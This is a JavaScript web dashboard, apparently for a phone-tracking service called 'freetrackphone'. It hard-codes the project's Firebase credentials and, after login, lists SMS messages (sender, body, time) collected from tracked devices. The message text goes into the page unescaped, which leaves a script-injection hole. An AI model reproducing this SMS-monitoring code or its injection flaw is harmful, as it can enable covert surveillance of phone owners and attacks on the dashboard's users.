// Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyDqglBTk9OHEYpkTpLd-sfMOJYhFpfS3sk",
  authDomain: "freetrackphone.firebaseapp.com",
  databaseURL: "https://freetrackphone-default-rtdb.firebaseio.com",
  projectId: "freetrackphone",
  storageBucket: "freetrackphone.appspot.com",
  messagingSenderId: "977909417074",
  appId: "1:977909417074:web:a2999495cbbc622cfaaeeb",
  measurementId: "G-LDH8WNHL5X"
};


// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const database = firebase.database();

// Your existing code for authentication, loading messages, and session handling.
$(document).ready(function () {
    // Toggle to show registration form
    $("#registerLink").click(function (e) {
        e.preventDefault();
        $("#loginForm").hide();
        $("#registerForm").show();
    });

    // Toggle to show login form
    $("#loginLink").click(function (e) {
        e.preventDefault();
        $("#registerForm").hide();
        $("#loginForm").show();
    });

    // Register new user
    $("#registerBtn").click(async function () {
        const email = $("#regEmail").val();
        const password = $("#regPassword").val();
        try {
            await auth.createUserWithEmailAndPassword(email, password);
            alert("Registration successful. Please log in.");
            $("#registerForm").hide();
            $("#loginForm").show();
        } catch (error) {
            alert("Error: " + error.message);
        }
    });

    // Login user
    $("#loginBtn").click(async function () {
        const email = $("#email").val();
        const password = $("#password").val();
        try {
            await auth.signInWithEmailAndPassword(email, password);
            $("#loginForm").hide();
            $("#messageLog").show();
            loadMessages();
        } catch (error) {
            alert("Error: " + error.message);
        }
    });

    // Logout user
    $("#logoutBtn").click(async function () {
        await auth.signOut();
        $("#messageLog").hide();
        $("#loginForm").show();
    });

    // Load messages for the logged-in user
    function loadMessages() {
        const user = auth.currentUser;
        if (user) {
            const userUid = user.uid;
            database.ref(`TrackPhone/${userUid}`).on("value", (snapshot) => {
                $("#messageList").empty();
                snapshot.forEach((deviceSnapshot) => {
                    const deviceId = deviceSnapshot.key;
                    deviceSnapshot.child("sms_messages").forEach((msgSnapshot) => {
                        const msgData = msgSnapshot.val();
                        const listItem = `
                            <li class="list-group-item">
                                <strong>Device:</strong> ${deviceId}<br>
                                <strong>Sender:</strong> ${msgData.sender}<br>
                                <strong>Message:</strong> ${msgData.messageBody}<br>
                                <strong>Timestamp:</strong> ${new Date(msgData.timestamp).toLocaleString()}
                            </li>
                        `;
                        $("#messageList").append(listItem);
                    });
                });
            });
        }
    }

    // Monitor auth state to handle session
    auth.onAuthStateChanged((user) => {
        if (user) {
            $("#loginForm, #registerForm").hide();
            $("#messageLog").show();
            loadMessages();
        } else {
            $("#messageLog").hide();
            $("#loginForm").show();
        }
    });
});
